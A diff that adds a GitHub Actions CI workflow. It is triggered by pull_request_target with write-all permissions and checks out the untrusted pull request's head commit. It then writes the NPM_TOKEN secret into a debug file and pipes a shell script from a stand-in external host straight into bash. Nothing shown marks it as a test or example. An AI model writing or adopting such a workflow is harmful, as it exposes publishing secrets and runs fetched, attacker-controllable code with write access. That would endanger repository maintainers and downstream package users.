@@ -1,0 +1,14 @@
+name: ci
+on:
+  pull_request_target:
+    types: [opened]
+permissions: write-all
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: echo "token=${{ secrets.NPM_TOKEN }}" >> debug.txt
+      - run: curl -fsSL https://get.example.invalid/setup.sh | bash
